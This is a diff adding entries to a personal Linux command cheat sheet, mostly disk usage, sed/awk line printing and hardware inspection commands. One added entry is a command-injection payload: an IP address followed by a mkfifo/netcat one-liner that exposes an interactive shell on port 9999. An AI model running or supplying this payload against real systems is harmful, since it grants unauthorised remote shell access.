@@ -42,7 +42,16 @@ grep -r --include '*.py' STRING .
 cp -R source dest
 ```
 
-* Get the size of a directory with du -s (summary) -h human readable
+* Get the size of a directory with du, disk usage, -s (summary) -h human readable
+```bash
+du -sh 
+```
+
+* Get the size of free space with df, disk free, -h human readable in 1024 power, -H in 1000 power
+```bash
+df -h 
+```
+
 * Get details of a directory -h human readable, -a show hidden, -l print details, -s sort by date
 ```bash
 ls -halt
@@ -257,8 +266,56 @@ dpkg --print-architecture
 ```bash
 lsb_release -a
 ```
+
+* Another way to get reverse shell with command execution
+```bash
+192.168.0.18; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1  | nc -lp 9999 > /tmp/f
+```
+
+* Print out the content of a file at LINE number (-n in sed is quiet), p = print
+```bash
+awk 'NR=LINE{print}' FILE
+sed -n -e LINEp FILE
+sed -n LINEp FILE
+sed -n 'LINE{p;q}' FILE
+```
+
+* Print out a range of line of a file
+```bash
+sed -n -e '100,110 p' FILE
+sed -n 100,110p FILE
+```
+
+* Output the first X line of a file
+```bash
+sed 'X{p;q}' FILE
+head -n X FILE
+```
+
+* Getting the current directory name in a cool way, it can be VERY USEFUL!
+```bash
+basename $PWD
+```
+
+* List all the graphics card, `-nn` Show PCI vendor and device codes, `-v` verbose.
+```bash
+lspci -vnn | grep VGA -A 12
+```
+* AWESOME grep FLAG, `-A NUM`, print NUM lines of trailing context after matching line
+```bash
+grep VGA -A 12
+```
+
+* Show CPU info
+```bash
+lscpu
+```
+* Show USB info, to determine the version of USB a flash drive is using, `-D` list devices.
+```bash
+lsusb
+lsusb -D /dev/bus/usb/003/023
+```
 * Copy to  a target directory and make ihe directory if it does not exist. `mkdir`, `-p` creates all directories
 ```
 mkdir -p PATH && cp FILE PATH
-
 ```
